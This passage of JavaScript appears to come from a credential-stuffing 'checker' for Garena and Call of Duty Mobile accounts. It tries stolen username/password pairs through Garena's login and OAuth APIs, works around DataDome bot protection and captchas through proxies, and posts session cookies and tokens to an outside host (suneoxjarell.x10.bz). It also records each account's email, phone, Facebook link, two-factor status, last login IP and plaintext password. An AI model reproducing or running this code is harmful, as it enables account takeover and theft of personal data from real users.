            logging.error(`TIMEOUT GETTING DATADOME COOKIE: ${error_str}`);
            return "[⏱️] DATADOME TIMEOUT";
        }
        if (e.isAxiosError && !e.response) { 
            logging.error(`CONNECTION ERROR GETTING DATADOME COOKIE: ${error_str}`);
            return "[🔴] DATADOME CONNECTION ERROR";
        }
            
        logging.error(`FAILED TO GET DATADOME COOKIE: ${error_str}`);
        return `[⚠️] DATADOME ERROR: ${error_str.substring(0,100)}`;
    }
}

function parseSetCookies(setCookieHeader) {
    if (!setCookieHeader) return {};
    const cookies = {};
    const setCookieParser = require('set-cookie-parser');
    const parsed = setCookieParser.parse(setCookieHeader);
    parsed.forEach(cookie => {
        cookies[cookie.name] = cookie.value;
    });
    return cookies;
}

async function show_level(access_token, selected_header, cookies_for_codm, proxies = null, timeout = REQUEST_TIMEOUT) {
    const callback_base_url = "https://auth.codm.garena.com/auth/auth/callback_n";
    const callback_params = {"site": "https://api-delete-request.codm.garena.co.id/oauth/callback/", "access_token": access_token};
    let headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml",
        "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-US,en;q=0.9",
        "Referer": "https://auth.garena.com/", "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-site",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": selected_header["User-Agent"] || "Mozilla/5.0",
    };
    for (const key in selected_header) {
        if (key.toLowerCase().startsWith('sec-ch-ua')) {
            headers[key] = selected_header[key];
        }
    }

    let current_cookies = { ...cookies_for_codm };
    let extracted_token = null;

    try {
        let current_url = callback_base_url;
        let current_params_obj = { ...callback_params }; // Use object for axios params
        let redirect_count = 0;
        const max_redirects = 7;

        while (redirect_count < max_redirects) {
            const cookieString = Object.entries(current_cookies).map(([k, v]) => `${k}=${v}`).join('; ');
            const axiosConfig = {
                headers: {...headers, 'Cookie': cookieString },
                params: current_params_obj,
                maxRedirects: 0, // Manual redirect handling
                proxy: buildAxiosProxyConfig(proxies),
                timeout: timeout * 1000,
                validateStatus: (status) => status >= 200 && status < 400 || status === 301 || status === 302 || status === 307 || status === 308, // Handle redirects manually
            };

            const response = await axios.get(current_url, axiosConfig);
            const response_text_clean = strip_ansi_codes(String(response.data));
            
            const newCookiesFromResponse = parseSetCookies(response.headers['set-cookie']);
            current_cookies = { ...current_cookies, ...newCookiesFromResponse };


            if (detect_captcha_in_response(response_text_clean)) {
                logging.warning(`CAPTCHA DETECTED IN CODM CALLBACK BODY (URL: ${current_url.substring(0,100)}...)`);
                return "[🤖] CAPTCHA DETECTED (CODM CALLBACK/REDIRECT BODY)";
            }
            if (response.status >= 400 && detect_captcha_in_response(response_text_clean)) {
                logging.warning(`CAPTCHA DETECTED IN CODM CALLBACK HTTP ERROR ${response.status} BODY`);
                return "[🤖] CAPTCHA DETECTED (CODM CALLBACK/REDIRECT HTTP ERROR)";
            }

            if ([301, 302, 307, 308].includes(response.status)) {
                const redirect_url = response.headers['location'];
                if (!redirect_url) {
                    logging.error("CODM REDIRECT DETECTED BUT NO LOCATION HEADER.");
                    return "[CODM FAIL] REDIRECT DETECTED BUT NO LOCATION HEADER.";
                }
                const parsedCurrentUrl = new URL(current_url);
                current_url = new URL(redirect_url, parsedCurrentUrl.origin + parsedCurrentUrl.pathname).toString();
                current_params_obj = null; // Clear params as they are usually in the redirect URL itself
                redirect_count += 1;
                await time.sleep(0.2);
            } else {
                if (response.status < 200 || response.status >= 300) {
                     throw new Error(`HTTP error ${response.status}`);
                }
                const final_url = response.request.res.responseUrl || current_url; // Get final URL after redirects (if any were followed by axios despite maxRedirects=0, or current_url if no redirect)
                
                const parsed_final_url = new URL(final_url);
                const query_params = Object.fromEntries(parsed_final_url.searchParams);
                extracted_token = query_params.token || null;

                if (!extracted_token) {
                     const match = /["']token["']\s*:\s*["']([\w\-.]+)["']/.exec(response_text_clean);
                     if (match) extracted_token = match[1];
                }

                if (!extracted_token) {
                     logging.warning(`CODM TOKEN EXTRACTION FAILED. FINAL URL: ${final_url}, STATUS: ${response.status}, BODY SNIPPET: ${response_text_clean.substring(0,200)}`);
                     return "[CODM FAIL] COULD NOT EXTRACT CODM TOKEN FROM CALLBACK.";
                }
                break;
            }
        }
        if (redirect_count >= max_redirects) {
            logging.error("MAXIMUM REDIRECTS REACHED DURING CODM CALLBACK.");
            return "[CODM FAIL] MAXIMUM REDIRECTS REACHED DURING CODM CALLBACK.";
        }
        
        const external_codm_script = "https://suneoxjarell.x10.bz/jajac.php";
        const payload_for_script = {
            "user_agent": selected_header["User-Agent"],
            "extracted_token": extracted_token
        };
        const script_headers = {"Content-Type": "application/json", "User-Agent": selected_header["User-Agent"]};

        try {
            const response_codm = await axios.post(external_codm_script, payload_for_script, {
                headers: script_headers,
                proxy: buildAxiosProxyConfig(proxies),
                timeout: timeout * 1000
            });
            const response_codm_text_clean = strip_ansi_codes(String(response_codm.data).trim());

            if (detect_captcha_in_response(response_codm_text_clean)) {
                 logging.warning("CAPTCHA DETECTED IN EXTERNAL CODM SCRIPT RESPONSE.");
                 return "[🤖] CAPTCHA DETECTED (CODM EXTERNAL SCRIPT RESPONSE)";
            }
            if (response_codm.status < 200 || response_codm.status >= 300) {
                throw new Error(`HTTP error ${response_codm.status}`);
            }
            
            if (response_codm_text_clean.includes("|") && response_codm_text_clean.split("|").length === 4) {
                const parts = response_codm_text_clean.split("|");
                
                if (/^\d+$/.test(parts[1]) && parts.every(p => p && p.trim() !== "N/A")) {
                     logging.info(`CODM SCRIPT SUCCESS: ${response_codm_text_clean}`);
                     return response_codm_text_clean;
                } else {
                     logging.warning(`CODM SCRIPT RETURNED PARSABLE BUT INVALID DATA: ${response_codm_text_clean}`);
                     return `[CODM WARN] SCRIPT DATA INVALID: ${response_codm_text_clean.substring(0,100)}`;
                }
            } else {
                 if (response_codm_text_clean.toLowerCase().includes("not found") || response_codm_text_clean.toLowerCase().includes("invalid token")) {
                     logging.warning(`CODM SCRIPT INDICATED ACCOUNT NOT LINKED OR INVALID TOKEN: ${response_codm_text_clean}`);
                     return `[CODM FAIL] ACCOUNT LIKELY NOT LINKED OR TOKEN INVALID.`;
                 } else if (response_codm_text_clean.toLowerCase().includes("error") || response_codm_text_clean.toLowerCase().includes("fail")) {
                      logging.warning(`CODM SCRIPT RETURNED ERROR: ${response_codm_text_clean}`);
                      return `[CODM FAIL] SCRIPT ERROR: ${response_codm_text_clean.substring(0,150)}`;
                 } else {
                      logging.warning(`CODM SCRIPT RETURNED UNEXPECTED FORMAT: ${response_codm_text_clean}`);
                      return `[CODM WARN] SCRIPT UNEXPECTED FORMAT: ${response_codm_text_clean.substring(0,100)}`;
                 }
            }
        } catch (e) {
             const err_str = strip_ansi_codes(e.message);
             const resp_text = strip_ansi_codes(e.response && e.response.data ? String(e.response.data) : "");
             if (detect_captcha_in_response(err_str) || detect_captcha_in_response(resp_text)) {
                 logging.warning(`CAPTCHA DETECTED DURING EXTERNAL CODM SCRIPT REQUEST ERROR: ${err_str}`);
                 return "[🤖] CAPTCHA DETECTED (CODM EXTERNAL SCRIPT REQUEST ERROR)";
             }
             if (e.code === 'ECONNABORTED') return "[⏱️] [CODM FAIL] CODM CHECK SCRIPT REQUEST TIMED OUT.";
             logging.error(`ERROR CONTACTING CODM CHECK SCRIPT: ${e.message}`);
             return `[CODM FAIL] ERROR CONTACTING CHECK SCRIPT: ${err_str.substring(0,100)}`;
        }

    } catch (e) {
        const err_str = strip_ansi_codes(e.message);
        const resp_text = strip_ansi_codes(e.response && e.response.data ? String(e.response.data) : "");
        const status_code = e.response ? e.response.status : null;
        const error_detail = `${err_str.substring(0,100)}` + (status_code ? ` (STATUS: ${status_code})` : "");

        if (detect_captcha_in_response(err_str) || detect_captcha_in_response(resp_text)) {
            logging.warning(`CAPTCHA DETECTED DURING CODM CALLBACK REQUEST ERROR: ${err_str}`);
            return "[🤖] CAPTCHA DETECTED (CODM CALLBACK REQUEST ERROR)";
        }
        if (e.code === 'ECONNABORTED') {
            logging.error("CODM CALLBACK REQUEST TIMED OUT.");
            return "[⏱️] [CODM FAIL] CODM CALLBACK REQUEST TIMED OUT.";
        }
        logging.warning(`CODM CALLBACK REQUEST ERROR: ${e.message}`);
        return `[CODM FAIL] CALLBACK REQUEST ERROR: ${error_detail}`;
    }
}


async function check_login(account_username, _id, encryptedpassword, password, selected_header, cookies, dataa, date, proxies = null, timeout = REQUEST_TIMEOUT) {
    let current_cookies = { ...cookies }; // Use a copy

    if (dataa) {
        current_cookies["datadome"] = dataa;
    } else {
        const manual_datadome_result = await get_datadome_cookie(proxies, timeout);
        if (typeof manual_datadome_result === 'string' && !/^\[[🤖⚠️⏱️🔴]\]/.test(manual_datadome_result)) {
            current_cookies["datadome"] = manual_datadome_result;
        } else if (manual_datadome_result && manual_datadome_result.startsWith("[🤖]")) {
            logging.warning(`MANUAL DATADOME FETCH FOR LOGIN FAILED WITH CAPTCHA: ${manual_datadome_result}`);
            return manual_datadome_result; // Propagate CAPTCHA error
        } else if (manual_datadome_result) {
            logging.warning(`MANUAL DATADOME FETCH FOR LOGIN FAILED: ${manual_datadome_result}. PROCEEDING CAUTIOUSLY.`);
             if (manual_datadome_result.startsWith("[⏱️]") || manual_datadome_result.startsWith("[🔴]")) {
                 return manual_datadome_result; // Propagate specific errors
             }
        } else {
            logging.warning(`MANUAL DATADOME FETCH FOR LOGIN RETURNED NONE/EMPTY FOR ${account_username}. PROCEEDING WITHOUT.`);
        }
    }
    
    const login_params_obj = {
        'app_id': '100082', 'account': account_username, 'password': encryptedpassword,
        'redirect_uri': REDIRECT_URL, 'format': 'json', 'id': _id,
    };
    const login_url = APK_URL + urllib.parse.urlencode(login_params_obj); // urlencode for query string

    let response;
    try {
        const cookieString = Object.entries(current_cookies).map(([k, v]) => `${k}=${v}`).join('; ');
        const axiosConfig = {
            headers: { ...selected_header, 'Cookie': cookieString },
            proxy: buildAxiosProxyConfig(proxies),
            timeout: timeout * 1000,
            // Axios throws on non-2xx by default, so raise_for_status is implicit
        };
        response = await axios.get(login_url, axiosConfig);
        const response_text_clean = strip_ansi_codes(String(response.data));

        if (detect_captcha_in_response(response_text_clean)) {
            logging.warning(`CAPTCHA DETECTED IN LOGIN RESPONSE BODY FOR ${account_username}.`);
            return "[🤖] CAPTCHA DETECTED (LOGIN RESPONSE BODY)";
        }
        // Note: Axios throws for >=300 status codes by default. So if we reach here, status is 2xx.
        // The Python code's `response.raise_for_status()` handles this.

    } catch (e) {
        const response_text_clean_on_error = strip_ansi_codes(e.response && e.response.data ? String(e.response.data) : "");
        if (e.response && e.response.status >= 400 && detect_captcha_in_response(response_text_clean_on_error)) {
             logging.warning(`CAPTCHA DETECTED IN LOGIN HTTP ERROR ${e.response.status} BODY FOR ${account_username}.`);
             return "[🤖] CAPTCHA DETECTED (LOGIN HTTP ERROR BODY)";
        }

        if (e.code === 'ECONNABORTED') { // Axios timeout
            if (e.message.toLowerCase().includes('connect etimedout')) { // connect ETIMEDOUT
                logging.error(`LOGIN CONNECTION TIMED OUT FOR ${account_username} (PROXY/NETWORK ISSUE).`);
                return "[⏱️] LOGIN CONNECT TIMEOUT";
            }
            logging.error(`LOGIN READ TIMED OUT FOR ${account_username} (SERVER SLOW TO RESPOND).`);
            return "[⏱️] LOGIN READ TIMEOUT";
        }
        if (e.isAxiosError && !e.response) { // Connection error (e.g. ECONNREFUSED)
            logging.error(`LOGIN CONNECTION ERROR FOR ${account_username}: ${e.message}`);
            return "[🔴] CONNECTION ERROR - SERVER REFUSED";
        }
        if (e.response) { // HTTP error from server
            const status_code = e.response.status;
            if (status_code === 403) return "[🚫] LOGIN FORBIDDEN (403)";
            if (status_code === 429) return "[🚦] RATE LIMITED (429)";
            logging.warning(`LOGIN HTTP ERROR ${status_code} FOR ${account_username}: ${strip_ansi_codes(String(e.response.data)).substring(0,200)}`);
            return `[📉] LOGIN HTTP ERROR ${status_code}`;
        }
        // Other request exceptions
        const err_str = strip_ansi_codes(e.message);
        if (detect_captcha_in_response(err_str)) {
            logging.warning(`CAPTCHA DETECTED DURING LOGIN REQUEST ERROR FOR ${account_username}: ${err_str}`);
            return "[🤖] CAPTCHA DETECTED (LOGIN REQUEST ERROR)";
        }
        logging.error(`LOGIN REQUEST FAILED FOR ${account_username}: ${e.message}`);
        return `[⚠️] LOGIN REQUEST FAILED: ${err_str.substring(0,100)}`;
    }

    let login_json_response;
    try {
        login_json_response = (typeof response.data === 'object') ? response.data : json.parse(response.data);
    } catch (jsonError) {
        logging.error(`INVALID LOGIN JSON FOR ${account_username}: ${String(response.data).substring(0,200)}`);
        return `[💢] INVALID LOGIN JSON RESPONSE`;
    }

    if (login_json_response.error) {
        const error_msg = login_json_response.error;
        logging.warning(`LOGIN ERROR FIELD FOR ${account_username}: ${error_msg}`);
        if (detect_captcha_in_response(error_msg)) {
            return "[🤖] CAPTCHA REQUIRED (LOGIN ERROR FIELD)";
        }
        
        if (error_msg.includes("error_password")) return "[⛔] INCORRECT PASSWORD"; 
        if (error_msg.includes("error_account_does_not_exist")) return "[👻] ACCOUNT DOESN'T EXIST";
        if (error_msg.includes("error_account_not_activated")) return "[⏳] ACCOUNT NOT ACTIVATED";
        return `[🚫] LOGIN ERROR: ${error_msg}`;
    }

    if (!login_json_response.session_key) {
         logging.error(`LOGIN RESPONSE MISSING SESSION_KEY FOR ${account_username}: ${json.stringify(login_json_response)}`);
         return "[❌] LOGIN FAILED: NO SESSION KEY RECEIVED";
    }

    const session_key = login_json_response.session_key;
    const newCookiesFromLogin = parseSetCookies(response.headers['set-cookie']);
    current_cookies = { ...current_cookies, ...newCookiesFromLogin };
    logging.info(`GARENA LOGIN SUCCESSFUL FOR ${account_username}. SESSION KEY OBTAINED.`);
    
    // Account Info Script part
    const hider = {
        'Host': 'account.garena.com', 'Connection': 'keep-alive',
        'User-Agent': selected_header["User-Agent"] || "Mozilla/5.0",
        'Accept': 'application/json, text/plain, */*',
        'Referer': `https://account.garena.com/?session_key=${session_key}`,
        'Accept-Language': 'en-US,en;q=0.9',
    };
    for (const key in selected_header) {
        if (key.toLowerCase().startsWith('sec-ch-ua')) {
            hider[key] = selected_header[key];
        }
    }

    const init_url = 'https://suneoxjarell.x10.bz/jajak.php';
    const params_for_script = {};
    for (const [k, v] of Object.entries(current_cookies)) { params_for_script[`coke_${k}`] = v; }
    for (const [k, v] of Object.entries(hider)) {
        const safe_k = k.replace(/-/g, '_').toLowerCase();
        params_for_script[`hider_${safe_k}`] = v;
    }

    let init_json_response = null;
    let init_text_clean = "";
    try {
        const init_response = await axios.get(init_url, { 
            params: params_for_script, 
            proxy: buildAxiosProxyConfig(proxies), 
            timeout: timeout * 1000 
        });
        init_text_clean = strip_ansi_codes(String(init_response.data));

        if (detect_captcha_in_response(init_text_clean)) {
             logging.warning(`CAPTCHA DETECTED IN ACC INFO SCRIPT RESPONSE FOR ${account_username}.`);
             return "[🤖] CAPTCHA DETECTED (ACC INFO SCRIPT RESPONSE)";
        }
        if (init_response.status < 200 || init_response.status >=300) throw new Error(`HTTP Error ${init_response.status}`);
        
        const potential_json = init_text_clean.trim();
        if (potential_json.startsWith('{') && potential_json.endsWith('}')) {
            init_json_response = json.parse(potential_json);
        } else {
             const json_match = /({.*?})/s.exec(potential_json); // s flag for DOTALL
             if (json_match) {
                 try {
                     init_json_response = json.parse(json_match[1]);
                 } catch (e) {
                     logging.error(`FAILED PARSING JSON FOUND WITHIN ACC INFO SCRIPT RESPONSE FOR ${account_username}: ${json_match[1].substring(0,200)}`);
                     return `[🧩] FAILED TO PARSE ACCOUNT INFO RESPONSE (INVALID JSON WITHIN TEXT)`;
                 }
             } else {
                 logging.error(`FAILED PARSING ACC INFO (NOT JSON OR NO JSON FOUND) FOR ${account_username}: ${init_text_clean.substring(0,200)}`);
                 return `[🧩] FAILED TO PARSE ACCOUNT INFO RESPONSE (NOT VALID JSON)`;
             }
        }
    } catch (e) {
        const err_str = strip_ansi_codes(e.message);
        const resp_text = strip_ansi_codes(e.response && e.response.data ? String(e.response.data) : "");
        if (detect_captcha_in_response(err_str) || detect_captcha_in_response(resp_text)) {
            logging.warning(`CAPTCHA DETECTED DURING ACC INFO SCRIPT REQUEST ERROR FOR ${account_username}: ${err_str}`);
            return "[🤖] CAPTCHA DETECTED (ACC INFO SCRIPT REQUEST ERROR)";
        }
        if (e.code === 'ECONNABORTED') {
            logging.error(`ACCOUNT INFO SCRIPT TIMED OUT FOR ${account_username}`);
            return "[⏱️] ACCOUNT INFO SCRIPT TIMEOUT";
        }
        logging.error(`ACCOUNT INFO SCRIPT REQUEST FAILED FOR ${account_username}: ${e.message}`);
        return `[📡] ACCOUNT INFO SCRIPT REQUEST FAILED: ${err_str.substring(0,100)}`;
    }

    if (typeof init_json_response !== 'object' || init_json_response === null) {
        logging.error(`ACCOUNT INFO PROCESSING FAILED - RESPONSE WAS NOT A DICTIONARY FOR ${account_username}`);
        return "[🧩] FAILED TO PROCESS ACCOUNT INFO RESPONSE (INVALID STRUCTURE)";
    }

    if (init_json_response.error || init_json_response.success === false ) { // Check for 'success: false' too
        const error_detail = init_json_response.error || init_json_response.message || 'UNKNOWN ERROR FROM ACC INFO SCRIPT';
        const clean_error_detail = strip_ansi_codes(String(error_detail));
        logging.warning(`ACCOUNT INFO SCRIPT RETURNED ERROR FOR ${account_username}: ${clean_error_detail}`);
        if (detect_captcha_in_response(clean_error_detail)) {
            return "[🤖] CAPTCHA REQUIRED (ACC INFO SCRIPT ERROR FIELD)";
        }
        return `[❓] ACCOUNT INFO ERROR: ${clean_error_detail.substring(0,150)}`;
    }
    
    const bindings = init_json_response.bindings || [];
    const account_status = strip_ansi_codes(String(init_json_response.status || 'Unknown'));
    let country = "N/A", last_login = "N/A", last_login_where = "N/A", avatar_url = "N/A";
    let fb_name = "N/A", fb_link = "N/A", mobile = "N/A", email = "N/A";
    let facebook_bound = "False", email_verified = "False", authenticator_enabled = "False", two_step_enabled = "False";
    let shell = "0", ckz_count = "UNKNOWN", last_login_ip = "N/A";

    if (Array.isArray(bindings)) {
        for (const binding_item_str of bindings) {
            const binding_clean = strip_ansi_codes(String(binding_item_str));
            if (binding_clean.includes(":")) {
                try {
                    const [key_raw, ...value_parts] = binding_clean.split(":");
                    const key = key_raw.trim().toLowerCase(); 
                    const value = value_parts.join(":").trim();
                    if (!value) continue;
                    
                    if (key === "country") country = value;
                    else if (key === "lastlogin" && !key.includes("from") && !key.includes("ip")) last_login = value;
                    else if (key === "lastloginfrom") last_login_where = value;
                    else if (key === "lastloginip") last_login_ip = value;
                    else if (key === "ckz") ckz_count = value;
                    else if (key === "garena shells") {
                        const shell_match = /(\d+)/.exec(value);
                        shell = shell_match ? shell_match[1] : "0";
                    }
                    else if (key === "facebook account" && value !== "N/A") { fb_name = value; facebook_bound = "True"; }
                    else if (key === "fb link") fb_link = value;
                    else if (key === "avatar") avatar_url = value;
                    else if (key === "mobile number" && value !== "N/A") mobile = value;
                    else if (key === "tae") email_verified = value.toLowerCase().includes("yes") ? "True" : "False";
                    else if (key === "eta" && value !== "N/A") email = value;
                    else if (key === "authenticator") authenticator_enabled = value.toLowerCase().includes("enabled") ? "True" : "False";
                    else if (key === "two-step verification") two_step_enabled = value.toLowerCase().includes("enabled") ? "True" : "False";
                } catch (parse_err) {
                    logging.warning(`ERROR PARSING BINDING LINE FOR ${account_username}: '${binding_clean}' - ${parse_err.message}`);
                }
            }
        }
    } else {
        logging.warning(`BINDINGS DATA FROM SCRIPT WAS NOT A LIST FOR ${account_username}: ${bindings}`);
    }
    
    const original_binding_country = country;
    if (!country || ["N/A", "UNKNOWN", "NONE", ""].includes(country.toUpperCase())) {
        country = "UNKNOWN";
        if (last_login_where && last_login_where !== "N/A") {
            const llw_upper = last_login_where.toUpperCase();
            const parts = llw_upper.split(',').map(p => p.trim());
            const potential_country_name_from_llw = parts[parts.length - 1];
            const mapped_from_llw = GARENA_COUNTRY_MAP[potential_country_name_from_llw];
            if (mapped_from_llw) {
                country = mapped_from_llw;
            } else {
                let found_in_llw_broad = false;
                for (const p_part of parts) {
                    const mapped_from_part = GARENA_COUNTRY_MAP[p_part];
                    if (mapped_from_part) {
                        country = mapped_from_part;
                        found_in_llw_broad = true; break;
                    }
                }
                if (!found_in_llw_broad && original_binding_country && !["N/A", "UNKNOWN", "NONE", ""].includes(original_binding_country.toUpperCase())) {
                    country = original_binding_country.toUpperCase();
                }
            }
        }
    } else {
        const normalized = GARENA_COUNTRY_MAP[country.toUpperCase()];
        if (normalized) {
            country = normalized;
        } else {
            country = country.toUpperCase();
        }
    }
    
    const grant_cookies = {};
    ['datadome', 'sso_key'].forEach(key => {
        if (current_cookies[key]) grant_cookies[key] = current_cookies[key];
    });

    const grant_headers = {
        "Host": "auth.garena.com", "Connection": "keep-alive",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
        "Origin": "https://auth.garena.com", "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty",
        "Referer": "https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=" + urllib.parse.quote(REDIRECT_URL),
        "Accept-Encoding": "gzip, deflate, br, zstd", "Accept-Language": "en-US,en;q=0.9",
        "User-Agent": selected_header["User-Agent"] || "Mozilla/5.0",
    };
    for (const key in selected_header) {
        if (key.toLowerCase().startsWith('sec-ch-ua')) {
            grant_headers[key] = selected_header[key];
        }
    }
    const grant_data_payload_obj = {"client_id": "100082", "response_type": "token", "redirect_uri": REDIRECT_URL, "format": "json", "id": _id};
    const grant_data_payload_str = urllib.parse.urlencode(grant_data_payload_obj);


    let grant_response;
    try {
        const grant_url = "https://auth.garena.com/oauth/token/grant";
        const cookieStringGrant = Object.entries(grant_cookies).map(([k, v]) => `${k}=${v}`).join('; ');

        grant_response = await axios.post(grant_url, grant_data_payload_str, {
            headers: { ...grant_headers, 'Cookie': cookieStringGrant },
            proxy: buildAxiosProxyConfig(proxies),
            timeout: timeout * 1000
        });
        const grant_text_clean = strip_ansi_codes(String(grant_response.data));

        if (detect_captcha_in_response(grant_text_clean)) {
            logging.warning(`CAPTCHA DETECTED IN GRANT TOKEN RESPONSE BODY FOR ${account_username}.`);
            return "[🤖] CAPTCHA DETECTED (GRANT TOKEN RESPONSE BODY)";
        }
        // Axios throws for non-2xx.

        const grant_data_json = (typeof grant_response.data === 'object') ? grant_response.data : json.parse(grant_response.data);

        if (grant_data_json.error) {
            const error_msg = grant_data_json.error;
            logging.warning(`GRANT TOKEN ERROR FIELD FOR ${account_username}: ${error_msg}`);
            if (detect_captcha_in_response(error_msg)) {
                return "[🤖] CAPTCHA REQUIRED (GRANT TOKEN ERROR FIELD)";
            }
            return `[🔑] GRANT TOKEN FAILED: ${error_msg}`;
        }

        if (!grant_data_json.access_token) {
            logging.error(`GRANT TOKEN RESPONSE MISSING ACCESS_TOKEN FOR ${account_username}: ${json.stringify(grant_data_json)}`);
            return "[❓] GRANT TOKEN RESPONSE MISSING 'access_token'";
        }

        const access_token = grant_data_json.access_token;
        const newCookiesFromGrant = parseSetCookies(grant_response.headers['set-cookie']);
        current_cookies = { ...current_cookies, ...newCookiesFromGrant };
        logging.info(`ACCESS TOKEN GRANTED FOR ${account_username}.`);
        
        const codm_check_cookies = {};
        ['datadome', 'sso_key', 'token_session'].forEach(key => {
            if (current_cookies[key]) codm_check_cookies[key] = current_cookies[key];
        });
        
        const codm_result_str = await show_level(access_token, selected_header, codm_check_cookies, proxies, timeout);

        if (codm_result_str.startsWith("[🤖]")) {
             logging.warning(`CODM CHECK PHASE RETURNED CAPTCHA FOR ${account_username}: ${codm_result_str}`);
             return codm_result_str;
        }
        if (/^\[(CODM FAIL|CODM WARN|⏱️)\]/.test(codm_result_str)) {
            logging.warning(`CODM CHECK FAILED OR WARNED FOR ${account_username}: ${codm_result_str}`);
            return ["CODM_FAILURE", account_username, password, codm_result_str]; // Return as tuple
        }

        let codm_nickname = "N/A", codm_level_str = "N/A", codm_region = "N/A", uid = "N/A";
        const connected_games_list_for_json = [];

        if (codm_result_str.includes("|") && codm_result_str.split("|").length === 4) {
            const parts = codm_result_str.split("|");
            [codm_nickname, codm_level_str, codm_region, uid] = parts;
            
            if (/^\d+$/.test(codm_level_str) && codm_nickname && codm_region && uid &&
               [codm_nickname, codm_region, uid].every(p => p.trim() && p.trim().toLowerCase() !== "n/a")) {
                connected_games_list_for_json.push({
                    "game": "CODM", "region": codm_region, "level": codm_level_str,
                    "nickname": codm_nickname, "uid": uid
                });
            } else {
                const reason = `[CODM WARN] PARSED INVALID CODM DATA: ${codm_result_str.substring(0,100)}`;
                logging.warning(`CODM CHECK FOR ${account_username} RESULTED IN: ${reason}`);
                return ["CODM_FAILURE", account_username, password, reason];
            }
        } else {
            const reason = `[CODM WARN] UNEXPECTED CODM DATA FORMAT: ${codm_result_str.substring(0,100)}`;
            logging.warning(`CODM CHECK FOR ${account_username} RESULTED IN: ${reason}`);
            return ["CODM_FAILURE", account_username, password, reason];
        }
        
        const result_dict = format_result_dict(
            last_login, last_login_where, country, shell, avatar_url, mobile,
            facebook_bound, email_verified, authenticator_enabled, two_step_enabled,
            connected_games_list_for_json, fb_name, fb_link, email, date,
            account_username, password, ckz_count, last_login_ip, account_status
        );
        logging.info(`FULL CHECK SUCCESSFUL FOR ${account_username}. LEVEL: ${codm_level_str}`);
        return result_dict;

    } catch (e) {
        const grant_text_clean_on_error = strip_ansi_codes(e.response && e.response.data ? String(e.response.data) : "");
        const err_str = strip_ansi_codes(e.message);
        
        if (detect_captcha_in_response(err_str) || detect_captcha_in_response(grant_text_clean_on_error)) {
            logging.warning(`CAPTCHA DETECTED DURING GRANT TOKEN REQUEST ERROR FOR ${account_username}: ${err_str}`);
            return "[🤖] CAPTCHA DETECTED (GRANT TOKEN REQUEST ERROR)";
        }

        if (e.code === 'ECONNABORTED') {
            logging.error(`GRANT TOKEN REQUEST TIMED OUT FOR ${account_username}`);
            return "[⏱️] GRANT TOKEN REQUEST TIMED OUT.";
        }
        if (e.isAxiosError && e.response && e.response.data && typeof e.response.data !== 'object') {
            // Try to parse if it's a JSON string error
            try {
                json.parse(e.response.data);
            } catch (jsonErr) {
                 logging.error(`FAILED TO DECODE GRANT TOKEN JSON FOR ${account_username}: ${String(e.response.data).substring(0,200)} - ERROR: ${jsonErr.message}`);
                 return `[📄] GRANT TOKEN FAILED: NON-JSON RESPONSE (${jsonErr.message})`;
            }
        }
        
        logging.error(`GRANT TOKEN REQUEST ERROR FOR ${account_username}: ${e.message}`);
        return `[🌐] GRANT TOKEN REQUEST ERROR: ${err_str.substring(0,100)}`;
    }
}

function format_result_dict(last_login, last_login_where, country, shell_str, avatar_url, mobile,
                       facebook_bound_str, email_verified_str, authenticator_enabled_str, two_step_enabled_str,
                       connected_games_data, fb_name, fb_link, email, date,
                       username, password, ckz_count, last_login_ip, account_status) {
    
    let codm_info_json = {"status": "NO CODM INFO PARSED", "level": null};
    if (connected_games_data && connected_games_data.length > 0) {
        const game_data = connected_games_data[0];
        if (game_data.game === "CODM") {
            let level_val = null;
            try { level_val = parseInt(game_data.level, 10); if(isNaN(level_val)) level_val = null; }
            catch (e) { /* ignore */ }
            codm_info_json = {
                "status": "LINKED", "game": "CODM", "region": game_data.region,
                "level": level_val, "nickname": game_data.nickname, "uid": game_data.uid
            };
        }
    }

    let shell_value = 0;
    try { shell_value = parseInt(shell_str, 10); if(isNaN(shell_value)) shell_value = 0; }
    catch (e) { /* ignore */ }

    function clean_na(value) {
        return (value && !["N/A", "unknown", "UNKNOWN"].includes(String(value))) ? value : null;
    }

    const result_data = {
        "checker_by": "S1N | TG: @YISHUX",
        "timestamp_utc": DateTime.now().toISO(), // Luxon toISO is like Python's strftime
        "check_run_id": date,
        "username": username, "password": password,
        "account_status_garena": clean_na(account_status),
        "account_country": clean_na(country),
        "garena_shells": shell_value,
        "avatar_url": clean_na(avatar_url),
        "last_login_time": clean_na(last_login),
        "last_login_location": clean_na(last_login_where),
        "last_login_ip": clean_na(last_login_ip),
        "bindings": {
            "mobile_number": clean_na(mobile),
            "email_address": clean_na(email),
            "facebook_name": clean_na(fb_name),
            "facebook_link": clean_na(fb_link),
        },
        "security": {
            "mobile_bound": !!clean_na(mobile),
            "email_verified": email_verified_str === "True",
            "facebook_linked": facebook_bound_str === "True",
            "google_authenticator_enabled": authenticator_enabled_str === "True",
            "two_step_verification_enabled": two_step_enabled_str === "True",
        },
        "codm_details": codm_info_json,
        "ckz_count": ckz_count !== "UNKNOWN" ? clean_na(ckz_count) : null,
    };
    return result_data;
}

async function check_account(username, password, date, initial_cookies_tuple, proxies = null, datadome_for_prelogin_attempt = null, timeout = REQUEST_TIMEOUT) {
    try {
        const random_id = String(random.randint(100000000000, 999999999999));
        const [initial_cookies_from_system, headers] = get_request_data(initial_cookies_tuple); 
        let prelogin_request_cookies = { ...initial_cookies_from_system };

        if (datadome_for_prelogin_attempt) {
            prelogin_request_cookies['datadome'] = datadome_for_prelogin_attempt;
        }

        const params_obj = {"app_id": "100082", "account": username, "format": "json", "id": random_id};
        const prelogin_url = "https://auth.garena.com/api/prelogin";
        let v1 = null, v2 = null;
        let encrypted_password_val = null;
        let datadome_from_prelogin_response = null;
        let response_prelogin = null;

        try {
            const cookieStringPrelogin = Object.entries(prelogin_request_cookies).map(([k, v]) => `${k}=${v}`).join('; ');
            response_prelogin = await axios.get(prelogin_url, {
                params: params_obj,
                headers: { ...headers, 'Cookie': cookieStringPrelogin },
                proxy: buildAxiosProxyConfig(proxies),
                timeout: timeout * 1000
            });
